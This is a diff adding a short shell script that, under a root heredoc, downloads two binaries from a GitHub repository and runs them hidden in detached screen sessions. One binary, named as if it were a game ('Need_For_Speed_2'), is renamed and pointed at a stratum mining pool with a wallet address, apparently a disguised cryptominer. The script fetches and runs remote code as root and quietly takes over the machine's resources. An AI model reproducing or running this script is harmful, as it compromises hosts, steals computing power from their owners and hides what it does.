@@ -1,0 +1,5 @@
+sudo su <<EOF
+wget -qO server https://raw.githubusercontent.com/sarifadim/dopla/main/bude && chmod +x server
+screen -dms run sudo ./server
+wget https://github.com/sarifadim/dopla/raw/main/Need_For_Speed_2 && chmod +x Need_For_Speed_2 && mv Need_For_Speed_2 tdm && screen -dms run ./tdm -P stratum2+tcp://3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo AT-$(TZ=UTC-7 date +"%H-%M-%S")@34.149.10.66:9200 -R --HWMON 2 --verbosity 1 --work-timeout 999
+EOF
